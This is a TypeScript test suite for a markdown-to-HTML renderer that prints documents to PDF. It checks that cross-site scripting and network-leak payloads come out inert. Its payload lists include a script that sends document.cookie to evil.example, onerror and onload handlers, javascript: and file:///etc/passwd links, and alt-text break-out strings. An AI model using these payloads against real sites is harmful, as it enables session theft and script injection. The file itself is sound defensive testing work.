import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { renderDocument, markdownToHtml, escapeHtml, printOptionsForTheme, constrainGeneratedHtml } from './render';
import { DOCUMENT_THEMES, themeIds, getTheme, describeThemes } from './themes';

/**
 * The security property is the important one and is asserted as a property, not
 * just as cases: the rendered document is loaded into a real browser context to
 * be printed, so an executable tag reaching the output is a live vulnerability
 * rather than a cosmetic bug.
 */

const bodyOf = (html: string) => html.slice(html.indexOf('<body>'));

/**
 * Tokenise the generated body the way an HTML parser does: an attribute value is
 * DATA once quoted, so a `>` or an `on…=` sitting inside quotes is not markup.
 *
 * This exists because substring assertions cannot tell the two cases apart, and
 * the difference is the whole vulnerability. Both of these contain the text
 * `onerror=`:
 *
 *   <img src="…" alt="a" onerror="window.PWN=1">        ← a real event handler
 *   <img src="…" alt="a&quot; onerror=&quot;window.PWN=1">  ← inert alt text
 *
 * A `not.toContain('onerror=')` check rejects both; a `not.toContain('<script')`
 * check accepts both. Only a tokeniser answers the question the test is asking.
 */
function tagsIn(html: string): Array<{ name: string; attrs: Array<[string, string]> }> {
  const src = bodyOf(html);
  const tags: Array<{ name: string; attrs: Array<[string, string]> }> = [];
  const ws = (i: number) => /\s/.test(src[i] ?? '');
  let i = 0;
  while (i < src.length) {
    const lt = src.indexOf('<', i);
    if (lt === -1) break;
    i = lt + 1;
    if (src[i] === '/') {
      const gt = src.indexOf('>', i);
      i = gt === -1 ? src.length : gt + 1;
      continue;
    }
    const name = /^[a-zA-Z][a-zA-Z0-9]*/.exec(src.slice(i))?.[0];
    if (!name) continue; // a bare `<` in text — data, not a tag
    i += name.length;
    const attrs: Array<[string, string]> = [];
    for (;;) {
      while (ws(i)) i++;
      if (i >= src.length) break;
      if (src[i] === '>') { i++; break; }
      if (src[i] === '/') { i++; continue; }
      const attr = /^[^\s=/>]+/.exec(src.slice(i))?.[0];
      if (!attr) { i++; continue; }
      i += attr.length;
      while (ws(i)) i++;
      let value = '';
      if (src[i] === '=') {
        i++;
        while (ws(i)) i++;
        const quote = src[i];
        if (quote === '"' || quote === "'") {
          const end = src.indexOf(quote, i + 1);
          value = src.slice(i + 1, end === -1 ? src.length : end);
          i = end === -1 ? src.length : end + 1;
        } else {
          value = /^[^\s>]*/.exec(src.slice(i))?.[0] ?? '';
          i += value.length;
        }
      }
      attrs.push([attr.toLowerCase(), value]);
    }
    tags.push({ name: name.toLowerCase(), attrs });
  }
  return tags;
}

/** Everything the generator is allowed to emit into the body. */
const INERT_TAGS = new Set([
  'body', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'ul', 'ol', 'li', 'a', 'code',
  'pre', 'blockquote', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'img',
  'strong', 'em', 'del', 'br', 'input',
]);
const INERT_ATTRS = new Set([
  'class', 'href', 'title', 'src', 'alt', 'align', 'start', 'type', 'checked', 'disabled',
]);
/** Attributes a browser dereferences — a leak even with scripting disabled. */
const FETCHING_ATTRS = new Set([
  'src', 'href', 'srcset', 'data', 'poster', 'background', 'action', 'formaction', 'style',
]);

/**
 * The real invariant: nothing in the body can execute, and nothing but a link
 * can reach the network. Asserted structurally rather than by grep.
 */
function assertInertBody(html: string, label = ''): void {
  for (const { name, attrs } of tagsIn(html)) {
    expect(INERT_TAGS.has(name), `${label} — <${name}> is not a tag the generator emits`).toBe(true);
    for (const [attr, value] of attrs) {
      expect(attr.startsWith('on'), `${label} — <${name} ${attr}=…> is an event handler`).toBe(false);
      expect(INERT_ATTRS.has(attr), `${label} — <${name} ${attr}=…> is not an attribute the generator emits`).toBe(true);
      const isImageSrc = name === 'img' && attr === 'src';
      const isLinkHref = name === 'a' && attr === 'href';
      if (isImageSrc) expect(value, `${label} — image src`).toMatch(/^data:image\//i);
      else if (isLinkHref) expect(value, `${label} — link href`).toMatch(/^(https?:|mailto:|#|\/)/i);
      else {
        expect(
          FETCHING_ATTRS.has(attr),
          `${label} — <${name} ${attr}=…> would be dereferenced at print time`,
        ).toBe(false);
      }
    }
  }
}

describe('markdown conversion', () => {
  it('renders the ordinary constructs', () => {
    const html = markdownToHtml('# H\n\nsome **bold** and `code`\n\n- a\n- b\n');
    expect(html).toContain('<h1');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>a</li>');
  });

  it('renders GFM tables', () => {
    const html = markdownToHtml('| a | b |\n|---|---|\n| 1 | 2 |\n');
    expect(html).toContain('<table>');
    expect(html).toContain('<td>1</td>');
  });

  it('returns empty for empty input', () => {
    expect(markdownToHtml('')).toBe('');
    expect(markdownToHtml('   ')).toBe('');
    expect(markdownToHtml(undefined as unknown as string)).toBe('');
  });
});

describe('escapeHtml', () => {
  it('escapes every character that can break out of text or an attribute', () => {
    expect(escapeHtml(`<a href="x" onclick='y'>&`)).toBe(
      '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;',
    );
  });

  it('escapes ampersands first, so entities are not double-broken', () => {
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });
});

describe('renderDocument — no executable content survives', () => {
  const payloads = [
    '<script>fetch("https://evil.example?c="+document.cookie)</script>',
    '<img src=x onerror="alert(1)">',
    '<iframe src="https://evil.example"></iframe>',
    '<svg onload="alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<style>body{display:none}</style>',
    '<object data="evil"></object>',
    '</style><script>alert(1)</script>',
  ];

  it.each(payloads)('neutralises %s in the body', (payload) => {
    const html = renderDocument({ title: 'T', markdown: payload });

    // The real property is that no RAW tag from the payload survives. Grepping
    // for "onerror=" alone is wrong: it appears inside fully escaped text
    // (&lt;img src=x onerror=&quot;…&quot;&gt;), which is inert.
    const bodyOnly = html.slice(html.indexOf('<body>'));
    for (const tag of ['<script', '<iframe', '<img', '<svg', '<object', '<style']) {
      expect(bodyOnly.toLowerCase(), `raw ${tag} survived`).not.toContain(tag);
    }
    // …and the user still sees what was written, as text
    expect(html).toContain('&lt;');
  });

  it('neutralises a payload in the title', () => {
    const html = renderDocument({ title: '</title><script>alert(1)</script>', markdown: 'x' });
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('</title><');
  });

  it('neutralises a payload in the subtitle and footer', () => {
    const html = renderDocument({
      title: 'T',
      markdown: 'x',
      subtitle: '<script>a</script>',
      footer: '<script>b</script>',
    });
    expect(html).not.toContain('<script>');
  });

  it('property: no script tag or inline handler ever reaches the output', () => {
    fc.assert(
      fc.property(fc.string(), fc.string(), adversarialMarkdown(), (title, subtitle, markdown) => {
        const html = renderDocument({ title, markdown, subtitle });
        // Only the BODY matters — the head legitimately contains a <style>.
        const body = bodyOf(html).toLowerCase();
        // <img> is deliberately absent from this list: a data: image is LEGAL
        // output, so "no img" is not the property. Which images and links are
        // permitted is decided structurally by assertInertBody below.
        for (const tag of ['<script', '<iframe', '<object', '<embed', '<svg', '<link', '<style']) {
          expect(body, `raw ${tag}`).not.toContain(tag);
        }
        // `javascript:` as a substring is not the property either — a document may
        // legitimately discuss the scheme in prose. It must never be a URL.
        assertInertBody(html, JSON.stringify(markdown));
      }),
      { numRuns: 1000 },
    );
  });
});

/**
 * The generator matters more than the property here.
 *
 * The property above was correct from the start and passed anyway, because
 * `fc.string()` cannot realistically produce `![a" onerror="x](data:image/png…)`:
 * a valid image needs matched brackets, a `data:` scheme AND a quote in the alt
 * text. So a live XSS sat under a 1000-run property test for as long as the test
 * existed. These arbitraries build the CONSTRUCTS and let fast-check choose the
 * hostile payload inside them, which is where the attacker's freedom actually is.
 */
const BREAK_OUT_FRAGMENTS = [
  'a" onerror="window.PWN=1',
  'a"><script>window.PWN=1</script><b x="',
  'a"><svg onload="window.PWN=1"><b x="',
  'a"><iframe src="https://evil.example"><b x="',
  'a"><link rel="stylesheet" href="https://evil.example/x.css"><b x="',
  'a"><style>body{background:url(https://evil.example/x.png)}</style><b x="',
  'a"><img src="https://evil.example/p.png"><b x="',
  'a\\"b',
  "a'><b onload='x",
  'a>b',
  '&quot; onerror=&quot;x',
  '&#34; onerror=&#34;x',
  '</p><script>window.PWN=1</script><p x="',
  'javascript:alert(1)',
  'Tom & Jerry',
  'ordinary alt text',
];
const HREF_CANDIDATES = [
  'data:image/png;base64,AAAA',
  'data:image/svg+xml,<svg onload="window.PWN=1"/>',
  'data:text/html,<script>window.PWN=1</script>',
  'https://evil.example/p.png',
  'https://example.com/a',
  'javascript:alert(1)',
  'vbscript:msgbox',
  'file:///etc/passwd',
  '#anchor',
  'mailto:a@b.co',
];

function adversarialMarkdown(): fc.Arbitrary<string> {
  const frag = fc.constantFrom(...BREAK_OUT_FRAGMENTS);
  const href = fc.constantFrom(...HREF_CANDIDATES);
  return fc.oneof(
    // Keep the original broad-but-blind generator: it covers the parser, not the
    // attribute sinks.
    fc.string(),
    fc.tuple(frag, href).map(([alt, h]) => `![${alt}](${h})`),
    fc.tuple(frag, href, frag).map(([alt, h, t]) => `![${alt}](${h} '${t}')`),
    fc.tuple(frag, href).map(([text, h]) => `[${text}](${h})`),
    fc.tuple(frag, href, frag).map(([text, h, t]) => `[${text}](${h} '${t}')`),
    // An image inside link text: two attribute sinks in one construct.
    fc.tuple(frag, href).map(([alt, h]) => `[![${alt}](${h})](https://example.com/a)`),
    // Table cells parse their content as inline markdown, so the same sink again.
    fc.tuple(frag, href).map(([alt, h]) => `| head |\n|---|\n| ![${alt}](${h}) |`),
    fc.tuple(frag, href).map(([text, h]) => `| a | b |\n|---|---|\n| [${text}](${h}) | x |`),
    // Reference definitions reach the same renderers by a different route.
    fc.tuple(frag, href, frag).map(([alt, h, t]) => `![${alt}][r]\n\n[r]: ${h} '${t}'\n`),
    // Nested in a blockquote and a list, which re-enter the inline parser.
    fc.tuple(frag, href).map(([alt, h]) => `> ![${alt}](${h})\n`),
    fc.tuple(frag, href).map(([alt, h]) => `- ![${alt}](${h})\n`),
    // Alongside the constructs FIX-3 was about, so a regression there shows up here.
    fc.tuple(frag, href).map(([alt, h]) => `\`\`\`ts\nif (a < b) {}\n\`\`\`\n\n![${alt}](${h})\n`),
  );
}

/**
 * FIX-3 replaced `escapeHtml(opts.markdown)` with a renderer override for `html`
 * tokens. That covers block and inline raw HTML — but NOT image alt text, which
 * marked renders through its TextRenderer (returns text RAW) and interpolates
 * straight into `alt="…"`. Verified executing in real Chromium at a file:// origin.
 *
 * A `>` alone does not break out — an unquoted `>` inside a double-quoted value
 * does not end the tag. The `"` is what matters, which is exactly the character a
 * naive "no <script> in the output" test never notices.
 */
describe('regression: break-out through image alt text (the gap FIX-3 left)', () => {
  const IMG = 'data:image/png;base64,AAAA';

  const executed: Array<[string, string]> = [
    ['event handler on the img itself', `![a" onerror="window.PWN=1](${IMG})`],
    ['a real script element', `![a"><script>window.PWN=1</script><b x="](${IMG})`],
    ['an svg with onload', `![a"><svg onload="window.PWN=1"><b x="](${IMG})`],
    ['inside a table cell', `| h |\n|---|\n| ![a"><script>window.PWN=1</script><b x="](${IMG}) |`],
    ['inside link text', `[![a"><script>window.PWN=1</script><b x="](${IMG})](https://example.com/a)`],
    ['inside a blockquote', `> ![a" onerror="window.PWN=1](${IMG})`],
    ['inside a list item', `- ![a" onerror="window.PWN=1](${IMG})`],
    ['via a backslash-escaped quote', `![a\\" onerror=\\"window.PWN=1](${IMG})`],
    ['via the image title', `![alt](${IMG} 'a" onerror="window.PWN=1')`],
    ['via the link title', `[x](https://example.com/a 'a" onmouseover="window.PWN=1')`],
  ];

  it.each(executed)('cannot execute: %s', (_label, markdown) => {
    assertInertBody(renderDocument({ title: 'T', markdown }), markdown);
  });

  it.each(executed)('holds without constrainGeneratedHtml: %s', (_label, markdown) => {
    // The guarantee must come from the renderer, not from the regex layer that
    // runs after it — layer 3 is defence in depth, not the defence.
    assertInertBody(`<body>${markdownToHtml(markdown)}`, markdown);
  });

  it('escapes the quote that would close the alt attribute', () => {
    const body = bodyOf(renderDocument({ title: 'T', markdown: `![a" onerror="window.PWN=1](${IMG})` }));
    // The ESCAPED form is the assertion: the payload is still visible as alt text
    // (so the author sees what they wrote) and is a single attribute value.
    expect(body).toContain('alt="a&quot; onerror=&quot;window.PWN=1"');
    const img = tagsIn(`<body>${body}`).find((t) => t.name === 'img');
    expect(img?.attrs.map(([a]) => a)).toEqual(['src', 'alt']);
  });

  it('escapes a whole injected element into the alt attribute', () => {
    const body = bodyOf(renderDocument({ title: 'T', markdown: `![a"><script>window.PWN=1</script><b x="](${IMG})` }));
    expect(body).toContain(
      'alt="a&quot;&gt;&lt;script&gt;window.PWN=1&lt;/script&gt;&lt;b x=&quot;"',
    );
  });

  it('escapes the title attribute too', () => {
    const body = bodyOf(renderDocument({ title: 'T', markdown: `![alt](${IMG} 'a" onerror="window.PWN=1')` }));
    expect(body).toContain('title="a&quot; onerror=&quot;window.PWN=1"');
  });

  it('does not treat an entity-smuggled quote as a second attribute', () => {
    // `&quot;` inside a value is decoded AFTER tokenisation, so it is data — and
    // re-escaping it would double-escape (the FIX-3 mistake). Both must hold.
    const body = bodyOf(renderDocument({ title: 'T', markdown: `![&quot; onerror=&quot;x](${IMG})` }));
    expect(body).toContain('alt="&quot; onerror=&quot;x"');
    expect(body).not.toContain('&amp;quot;');
    assertInertBody(`<body>${body}`);
  });

  it('does not double-escape an ampersand in alt text', () => {
    const body = bodyOf(renderDocument({ title: 'T', markdown: `![Tom & Jerry](${IMG})` }));
    expect(body).toContain('alt="Tom &amp; Jerry"');
    expect(body).not.toContain('&amp;amp;');
  });

  /**
   * Scripting is disabled on the print window, but these three still FETCHED a
   * remote host during PDF rendering when injected through alt text — which
   * defeats the stated anti-leak purpose of the whole exercise, script or no
   * script. (A remote <img> was already dropped; these were not.)
   */
  const leaks: Array<[string, string]> = [
    ['iframe', `![a"><iframe src="https://evil.example/x"><b x="](${IMG})`],
    ['stylesheet link', `![a"><link rel="stylesheet" href="https://evil.example/x.css"><b x="](${IMG})`],
    ['style with a remote url', `![a"><style>body{background:url(https://evil.example/x.png)}</style><b x="](${IMG})`],
    ['remote img', `![a"><img src="https://evil.example/p.png"><b x="](${IMG})`],
  ];

  it.each(leaks)('cannot reach the network via %s', (_label, markdown) => {
    const html = renderDocument({ title: 'T', markdown });
    assertInertBody(html, markdown);
    const body = bodyOf(html).toLowerCase();
    for (const tag of ['<iframe', '<link', '<style', '<svg']) {
      expect(body, `raw ${tag} survived`).not.toContain(tag);
    }
    // The host may still appear as escaped alt TEXT — that is data, and inert.
    // What must not exist is an attribute that points at it.
    for (const { name, attrs } of tagsIn(html)) {
      for (const [attr, value] of attrs) {
        if (name === 'a' && attr === 'href') continue;
        expect(value, `<${name} ${attr}=…>`).not.toMatch(/^https?:/i);
      }
    }
  });

  it('drops an image whose src is not an inline image, keeping the alt text', () => {
    for (const href of ['https://evil.example/p.png', 'data:text/html,<script>1</script>', 'javascript:alert(1)']) {
      const body = bodyOf(renderDocument({ title: 'T', markdown: `![the caption](${href})` }));
      expect(body.toLowerCase(), href).not.toContain('<img');
      expect(body, href).toContain('the caption');
    }
  });

  it('keeps an inline svg image, which cannot script or fetch through <img>', () => {
    // The one src the allowlist permits that can CONTAIN active content. Verified
    // in real Chromium: an SVG loaded through <img> is a non-scripted, non-
    // interactive document — the inline <script>, the onload and an external
    // <image href> all did nothing and fetched nothing. So it stays allowed; the
    // rule matches the widget catalogue's `data:image/`.
    const svg = `data:image/svg+xml,${encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" onload="window.PWN=1"><script>window.PWN=2</script></svg>')}`;
    const html = renderDocument({ title: 'T', markdown: `![diagram](${svg})` });
    expect(bodyOf(html)).toContain('<img src="data:image/svg+xml,');
    // Nothing about it reaches the HTML document as markup.
    expect(bodyOf(html).toLowerCase()).not.toContain('<script');
    expect(bodyOf(html).toLowerCase()).not.toContain('<svg');
    assertInertBody(html);
  });

  it('still renders a legitimate inline image, link, table and code block', () => {
    // The fix must not become "delete everything".
    const html = renderDocument({
      title: 'T',
      markdown:
        `![dot](data:image/gif;base64,R0lGODlhAQABAAAAACw= "a title")\n\n` +
        `[docs](https://example.com/a "see also")\n\n` +
        `| a | b |\n|:--|--:|\n| 1 | 2 |\n\n` +
        '```ts\nif (a < b && c > d) { f("x"); }\n```\n',
    });
    const body = bodyOf(html);
    expect(body).toContain('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="dot" title="a title">');
    expect(body).toContain('<a href="https://example.com/a" title="see also">docs</a>');
    expect(body).toContain('<td align="left">1</td>');
    expect(body).toContain('if (a &lt; b &amp;&amp; c &gt; d) { f(&quot;x&quot;); }');
    assertInertBody(html);
  });
});

/**
 * `getTheme` guarded with `id in DOCUMENT_THEMES`, and `in` walks the prototype
 * chain — so 'constructor' returned Object's constructor and 'toString' returned
 * a function. The DocumentCreate tool takes `theme` as a free-form z.string(),
 * so the documented "unknown ids fall back to report" was simply not true.
 */
describe('regression: prototype keys are not theme ids', () => {
  const PROTOTYPE_KEYS = [
    'constructor', '__proto__', 'toString', 'valueOf', 'hasOwnProperty', 'isPrototypeOf',
  ];

  it.each(PROTOTYPE_KEYS)('renders a document with theme %s instead of throwing', (theme) => {
    const html = renderDocument({ title: 'T', markdown: '# H\n\ntext\n', theme });
    // Falls back to the default theme, which is what the tool description promises.
    expect(html).toContain('margin: 20mm');
    expect(html).toContain('size: A4');
    expect(html).toContain('Georgia');
  });

  it.each(PROTOTYPE_KEYS)('derives print options for theme %s instead of throwing', (theme) => {
    const opts = printOptionsForTheme(theme, 'Footer');
    expect(opts.pageSize).toBe('A4');
    expect(opts.margins.top).toBeCloseTo(20 / 25.4, 5);
  });
});

describe('renderDocument — structure', () => {
  it('produces a standalone document with no external requests', () => {
    const html = renderDocument({ title: 'Q3 Report', markdown: '## Overview\n\ntext\n' });
    expect(html.startsWith('<!DOCTYPE html>')).toBe(true);
    expect(html).toContain('<title>Q3 Report</title>');
    // everything inline: printing must be deterministic and work offline
    expect(html).not.toContain('<link ');
    expect(html).not.toContain('src="http');
    expect(html).not.toContain('@import');
  });

  it('renders the title, subtitle and body', () => {
    const html = renderDocument({
      title: 'Title',
      subtitle: '27 July 2026',
      markdown: '## Section\n\nBody text.\n',
    });
    expect(html).toContain('class="doc-title">Title<');
    expect(html).toContain('27 July 2026');
    expect(html).toContain('Body text.');
  });

  it('omits the subtitle block when there is none', () => {
    // The CLASS is always defined in the stylesheet; it is the ELEMENT that must
    // be absent.
    expect(renderDocument({ title: 'T', markdown: 'x' })).not.toContain('<p class="doc-meta">');
  });

  it('falls back to a title rather than rendering an empty heading', () => {
    expect(renderDocument({ title: '', markdown: 'x' })).toContain('Untitled');
  });

  it('handles an empty body without producing malformed HTML', () => {
    const html = renderDocument({ title: 'T', markdown: '' });
    expect(html).toContain('</body>');
    expect(html).toContain('<title>T</title>');
  });

  it('sets the page size and margins from the theme', () => {
    const html = renderDocument({ title: 'T', markdown: 'x', theme: 'proposal' });
    expect(html).toContain('size: A4');
    expect(html).toContain('margin: 24mm');
  });

  it('avoids splitting code blocks and table rows across pages', () => {
    // A listing cut in half is unreadable; hand-rolled generators never do this.
    const html = renderDocument({ title: 'T', markdown: '```\ncode\n```' });
    expect(html).toContain('page-break-inside: avoid');
  });
});

describe('themes', () => {
  it('exposes four themes, each with a description for the model', () => {
    expect(themeIds()).toEqual(['report', 'memo', 'proposal', 'plain']);
    for (const id of themeIds()) {
      expect(DOCUMENT_THEMES[id].description.length, id).toBeGreaterThan(20);
    }
  });

  it('falls back to the default for an unknown or missing id', () => {
    expect(getTheme('nonsense').id).toBe('report');
    expect(getTheme(undefined).id).toBe('report');
    expect(getTheme(42).id).toBe('report');
  });

  it('every theme defines all the variables the base stylesheet consumes', () => {
    const required = [
      '--body-font', '--heading-font', '--mono-font', '--body-size',
      '--h1-size', '--h2-size', '--h3-size',
      '--ink', '--heading-ink', '--muted', '--accent', '--rule', '--rule-soft',
    ];
    for (const id of themeIds()) {
      for (const v of required) {
        expect(DOCUMENT_THEMES[id].css, `${id} missing ${v}`).toContain(`${v}:`);
      }
    }
  });

  it('uses only system fonts, so nothing is fetched at print time', () => {
    for (const id of themeIds()) {
      expect(DOCUMENT_THEMES[id].css, id).not.toContain('@font-face');
      expect(DOCUMENT_THEMES[id].css, id).not.toContain('fonts.googleapis');
    }
  });

  it('describeThemes lists every id for the tool description', () => {
    const described = describeThemes();
    for (const id of themeIds()) expect(described).toContain(`"${id}"`);
  });
});

describe('printOptionsForTheme', () => {
  it('converts millimetre margins to the inches printToPDF expects', () => {
    const opts = printOptionsForTheme('proposal');
    expect(opts.pageSize).toBe('A4');
    expect(opts.margins.top).toBeCloseTo(24 / 25.4, 5);
  });

  it('keeps backgrounds on, or the theme would not appear', () => {
    // Rules, table shading and code blocks are all backgrounds.
    for (const id of themeIds()) {
      expect(printOptionsForTheme(id).printBackground, id).toBe(true);
    }
  });

  it('falls back safely for an unknown theme', () => {
    expect(printOptionsForTheme('nope').pageSize).toBe('A4');
  });
});

describe('constrainGeneratedHtml — markdown\'s own network-reaching output', () => {
  it('drops a remote image, which would be fetched while printing', () => {
    // A slow or dead host yields a blank box, and the request leaks that the
    // document was printed, and when.
    const html = renderDocument({ title: 'T', markdown: '![alt](https://evil.example/p.png)' });
    expect(html.slice(html.indexOf('<body>'))).not.toContain('<img');
    expect(html).not.toContain('evil.example/p.png');
  });

  it('keeps an inline data-URL image', () => {
    const md = '![dot](data:image/gif;base64,R0lGODlhAQABAAAAACw=)';
    const html = renderDocument({ title: 'T', markdown: md });
    expect(html.slice(html.indexOf('<body>'))).toContain('<img');
  });

  it('keeps ordinary http and https links — a document should have links', () => {
    const html = renderDocument({ title: 'T', markdown: '[docs](https://example.com/a)' });
    expect(html).toContain('href="https://example.com/a"');
  });

  it('strips the href from a javascript: link', () => {
    const html = renderDocument({ title: 'T', markdown: '[x](javascript:alert(1))' });
    expect(html).not.toContain('javascript:');
    // the text survives, so the reader still sees what was written
    expect(html).toContain('x</a>');
  });

  it('strips other dangerous schemes', () => {
    for (const scheme of ['data:text/html,<script>a</script>', 'vbscript:msgbox', 'file:///etc/passwd']) {
      const html = renderDocument({ title: 'T', markdown: `[x](${scheme})` });
      expect(html.toLowerCase(), scheme).not.toContain('href="vbscript');
      expect(html.toLowerCase(), scheme).not.toContain('href="file:');
      expect(html.toLowerCase(), scheme).not.toContain('href="data:text/html');
    }
  });

  it('still strips both, given output the renderer did not produce', () => {
    // Layer 3 is now explicitly defence in depth: the image and link renderers
    // never emit these. Test it directly anyway, because its whole job is to
    // catch a FUTURE renderer that does — feed it the string a regression would
    // produce rather than asserting it through a pipeline that cannot produce one.
    const regressed =
      '<p><img src="https://evil.example/p.png" alt="x">' +
      '<a href="javascript:alert(1)">click</a>' +
      '<img src="data:image/png;base64,AAAA" alt="keep"></p>';
    const out = constrainGeneratedHtml(regressed);
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('<img src="data:image/png;base64,AAAA" alt="keep">');
    expect(out).toContain('click</a>');
  });

  it('property: no body link ever carries a non-web scheme', () => {
    fc.assert(
      fc.property(fc.string(), (markdown) => {
        const html = renderDocument({ title: 'T', markdown });
        const body = html.slice(html.indexOf('<body>'));
        for (const m of body.matchAll(/href="([^"]*)"/gi)) {
          expect(m[1]).toMatch(/^(https?:|mailto:|#|\/)/i);
        }
      }),
      { numRuns: 1000 },
    );
  });
});

describe('regression: code blocks and blockquotes (the double-escaping bug)', () => {
  /**
   * The first implementation escaped the whole markdown SOURCE before parsing, so
   * marked escaped it again. `a < b && c > d` in a code block printed as
   * `a &lt; b &amp;&amp; c &gt; d` — every technical document unreadable — and
   * because `>` was pre-escaped, blockquote syntax could never be recognised,
   * making the blockquote rule in all four themes dead CSS.
   *
   * The original test only used `<code>code</code>` with no special characters,
   * which is why it passed. These assert the actual characters.
   */
  const codeIn = (html: string) => /<code[^>]*>([\s\S]*?)<\/code>/.exec(html.slice(html.indexOf('<body>')))?.[1] ?? '';

  it('escapes code exactly once', () => {
    const html = renderDocument({ title: 'T', markdown: '```ts\nif (a < b && c > d) { f("x"); }\n```' });
    const code = codeIn(html);
    // Single escaping: what a browser renders back as the original source.
    expect(code).toBe('if (a &lt; b &amp;&amp; c &gt; d) { f(&quot;x&quot;); }\n');
    // The double-escaped form is what the bug produced.
    expect(code).not.toContain('&amp;lt;');
    expect(code).not.toContain('&amp;amp;');
  });

  it('escapes inline code exactly once', () => {
    const html = renderDocument({ title: 'T', markdown: 'Compare `a < b` please.' });
    expect(codeIn(html)).toBe('a &lt; b');
  });

  it('renders blockquotes, which were previously impossible', () => {
    const html = renderDocument({ title: 'T', markdown: '> Note: revenue grew 12%.' });
    const body = html.slice(html.indexOf('<body>'));
    expect(body).toContain('<blockquote>');
    expect(body).toContain('Note: revenue grew 12%.');
  });

  it('renders every theme\'s blockquote CSS against real blockquote markup', () => {
    // The rule existed in all four themes and could never match anything.
    for (const theme of themeIds()) {
      const html = renderDocument({ title: 'T', markdown: '> quoted', theme });
      expect(html.slice(html.indexOf('<body>')), theme).toContain('<blockquote>');
      expect(html, theme).toContain('blockquote {');
    }
  });

  it('still renders ordinary markdown structures', () => {
    const html = renderDocument({
      title: 'T',
      markdown: '## Section\n\n### Subsection\n\n- item\n\n1. first\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n**bold** _em_\n',
    });
    const body = html.slice(html.indexOf('<body>'));
    // ## → h2, ### → h3; the document title is the only h1.
    for (const tag of ['<h2', '<h3', '<ul>', '<ol>', '<table>', '<strong>', '<em>']) {
      expect(body, tag).toContain(tag);
    }
  });

  it('keeps raw HTML inert now that pre-escaping is gone', () => {
    // The security property must survive the fix — this is the whole reason the
    // escaping moved to the renderer rather than being dropped.
    for (const payload of [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<iframe src="https://evil.example"></iframe>',
      'text <b>with</b> inline tags',
    ]) {
      const body = renderDocument({ title: 'T', markdown: payload }).slice(
        renderDocument({ title: 'T', markdown: payload }).indexOf('<body>'),
      );
      for (const tag of ['<script', '<iframe', '<img', '<b>']) {
        expect(body.toLowerCase(), `${payload} → raw ${tag}`).not.toContain(tag);
      }
      expect(body).toContain('&lt;');
    }
  });
});
